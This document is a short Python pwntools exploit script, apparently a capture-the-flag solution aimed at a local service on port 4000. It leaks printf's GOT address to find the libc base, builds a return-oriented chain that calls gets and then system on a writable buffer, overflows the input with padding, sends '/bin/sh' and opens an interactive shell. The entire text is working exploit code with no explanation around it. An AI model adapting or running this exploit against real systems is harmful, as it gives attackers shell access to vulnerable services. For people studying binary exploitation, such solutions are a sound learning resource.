from pwn import *

printf_got_plt = 0x804A010
printf_off = 0x0004cdd0

c = remote('127.0.0.1', 4000)
c.recvuntil(':')
c.sendline(str(printf_got_plt))
c.recvuntil(':')
libc_base = int(c.recvuntil('\n').strip(), 16) - printf_off
gets = 0x00064440 + libc_base
system = 0x0003fe70 + libc_base
buf = 0x0804b000 - 50

rop = [
	gets,
	system,
	buf,
	buf,
]
c.recvuntil(':')
c.sendline('a'*60 + flat(rop))
sleep(2)
c.sendline('/bin/sh\x00')
c.interactive()
